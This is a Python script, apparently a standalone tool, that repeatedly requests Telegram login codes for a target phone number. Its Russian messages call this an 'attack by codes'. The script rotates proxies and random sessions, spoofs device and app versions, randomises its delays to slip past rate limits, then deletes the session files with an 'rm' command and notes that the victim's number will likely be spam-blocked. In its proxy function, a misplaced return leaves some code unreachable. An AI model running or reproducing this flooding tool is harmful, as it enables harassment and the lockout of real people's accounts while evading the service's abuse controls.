import asyncio
import random
import string
import numpy as np
import os
import re
from telethon import TelegramClient
from termcolor import colored

def load_proxy_list():
    if not os.path.exists("proxy_list.txt"):
        return []
    with open("proxy_list.txt", "r") as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    return proxies

PROXY_LIST = load_proxy_list()

def parse_proxy(proxy_str: str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

   
    if proxy_str.startswith('mtproto://'):
        rest = proxy_str[10:] 
        secret = None
        if '@' in rest:
            secret, rest = rest.split('@', 1)
        if ':' not in rest:
            return None
        host, port_part = rest.split(':', 1)
        port = int(''.join(filter(str.isdigit, port_part)))
        return ('mtproto', host, port, secret)

   
    if proxy_str.startswith('socks5://'):
        proxy_str = proxy_str[9:]
    elif proxy_str.startswith('socks4://'):
        proxy_str = proxy_str[9:]
    elif proxy_str.startswith('http://'):
        proxy_str = proxy_str[7:]
    elif proxy_str.startswith('https://'):
        proxy_str = proxy_str[8:]

    
    username = password = None
    if '@' in proxy_str:
        auth, proxy_str = proxy_str.split('@', 1)
        if ':' in auth:
            username, password = auth.split(':', 1)
        else:
            username = auth

 
    if ':' not in proxy_str:
        return None
    host, port_part = proxy_str.split(':', 1)
    port = int(''.join(filter(str.isdigit, port_part)))
    return ('socks5', host, port, username, password)

def get_random_proxy_tuple():
    if not PROXY_LIST:
        return None
        proxy_str = random.choice(PROXY_LIST)
        proxy_tuple = parse_proxy(proxy_str)
        if proxy_tuple:
            return proxy_tuple
    for proxy_str in PROXY_LIST:
        proxy_tuple = parse_proxy(proxy_str)
        if proxy_tuple:
            return proxy_tuple
    return None

async def send_one_code(phone, api_id, api_hash, session_name, proxy_tuple):
    try:
        device = random.choice(["Google Pixel 7", "Samsung Galaxy S23", "Xiaomi 13", "OnePlus 11"])
        client = TelegramClient(
            session_name, api_id, api_hash,
            device_model=device,
            system_version=random.choice(["Android 14", "Android 13"]),
            app_version=random.choice(["10.4.2 (3450)", "10.3.1 (3390)"]),
            lang_code="ru",
            proxy=proxy_tuple
        )
        await client.connect()
        await client.send_code_request(phone)
        await client.disconnect()
        return True
    except Exception as e:
        print(colored(f"[-] Ошибка: {str(e)[:50]}", 'red'))
        return False
async def send_telegram_codes_async(phone, api_id, api_hash, count=35):
    print(colored(f"[*] Атака кодами: цель {phone}, попыток: {count}", "yellow"))
    success = 0
    for i in range(1, count + 1):
        session_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        proxy_tuple = get_random_proxy_tuple()
        ok = await send_one_code(phone, api_id, api_hash, session_name, proxy_tuple)
        if ok:
            success += 1
            print(colored(f"[+] Код {i}/{count} успешно отправлен", 'green'))
        else:
            print(colored(f"[-] Код {i}/{count} не отправлен", 'red'))
        delay = max(2, np.random.normal(14, 4))
        await asyncio.sleep(delay)
    os.system("rm *.session 2>/dev/null")
    print(colored(f"[*] Атака кодами завершена. Успешно: {success}/{count}", "cyan"))
    if success > 20:
        print(colored("[!] Высокая вероятность временной блокировки номера (спам-блок)", "yellow"))